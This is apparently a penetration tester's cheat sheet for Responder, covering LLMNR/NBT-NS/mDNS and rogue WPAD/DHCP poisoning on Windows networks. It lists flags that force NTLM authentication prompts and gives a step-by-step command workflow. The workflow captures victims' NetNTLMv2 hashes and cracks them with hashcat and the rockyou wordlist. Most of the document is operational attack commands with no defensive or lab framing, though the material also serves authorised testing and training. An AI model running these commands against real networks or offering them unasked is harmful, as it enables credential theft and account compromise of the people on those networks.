# 🛠️ Tool Master Guide: Responder & LLMNR/NBT-NS Poisoning

> [!INFO] 📋 **Root Metadata**
> - **Tool Name**: Responder
> - **Category**: Local Network Name Resolution Poisoner & Hash Sniffer (#1 Choice)
> - **License**: Open Source (GPL-3.0)
> - **Installation Command**: `sudo apt update && sudo apt install -y responder`
> - **Binary Path**: `/usr/bin/responder`
> - **Config File**: `/etc/responder/Responder.conf`
> - **Captured Logs / Hashes Dir**: `/var/lib/responder/logs/`
> - **Primary Objective**: Answers unauthenticated local Windows broadcast queries (LLMNR, NBT-NS, mDNS) to trick victim client machines into sending NetNTLMv1/NetNTLMv2 authentication hashes to Kali.

---

## 📋 1. Core Config & CLI Parameter Reference Matrix

| Option / Flag | Technical Description | Operational Impact |
| :--- | :--- | :--- |
| `-I <interface>` | Specifies active network interface | `sudo responder -I eth0` |
| `-d, --dhcp` | Enables rogue DHCP WPAD broadcast poisoning | Answers DHCP requests to inject WPAD server URL |
| `-w, --wpad` | Enables rogue WPAD authentication server | Prompts Windows clients for NTLM authentication upon browser start |
| `-r, --wpad-auth` | Forces NTLM basic authentication prompt on WPAD rogue server | Captures cleartext/NetNTLM credentials |
| `-v, --verbose` | Displays verbose network broadcast queries | Shows real-world victim IP addresses & queries |

---

## 💻 2. Practical Operational Workflow

```bash
# Step 1: Edit /etc/responder/Responder.conf (Verify HTTP = On, SMB = On)
sudo nano /etc/responder/Responder.conf

# Step 2: Start Responder Listener on Interface eth0
sudo responder -I eth0 -d -w -r -v

# Step 3: Monitor Captured NetNTLMv2 Hashes in Output Directory
cat /var/lib/responder/logs/HTTP-NTLMv2-*.txt

# Step 4: Crack Captured NetNTLMv2 Hash using Hashcat (-m 5600)
hashcat -m 5600 captured_ntlmv2.txt /usr/share/wordlists/rockyou.txt -w 3
```
